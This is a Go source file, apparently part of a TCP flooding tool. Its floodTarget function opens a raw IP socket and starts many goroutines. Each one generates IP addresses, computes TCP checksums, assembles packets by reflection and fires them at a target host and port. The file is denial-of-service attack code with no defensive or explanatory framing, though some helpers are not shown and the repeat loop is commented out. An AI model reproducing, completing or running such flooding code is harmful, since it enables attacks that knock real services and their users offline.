package main

import (
	"log"
	"reflect"
	"sync"
	"syscall"
)

func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
	err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
	if err != nil {
		//log.Println(err)
	}
}

func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value, clients int, wg *sync.WaitGroup) {
	var dest [4]byte
	copy(dest[:], tcp.DST[:4])
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	err = syscall.BindToDevice(fd, tcp.Adapter)
	if err != nil {
		log.Println(err)
	}

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	for i := 0; i < clients; i++ {
		wg.Add(1)
		go func(rType reflect.Type, rVal reflect.Value, fd int,
			addr syscall.SockaddrInet4, wg *sync.WaitGroup) {
			defer wg.Done()
			// for {
				tcp.genIP()
				tcp.calcTCPChecksum()
				tcp.buildPayload(rType, rVal)
				tcp.rawSocket(fd, addr)
			// }
			for {}
		}(rType, rVal, fd, addr, wg)
	}
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
	tcp.Payload = make([]byte, 60)
	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					tcp.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}
}
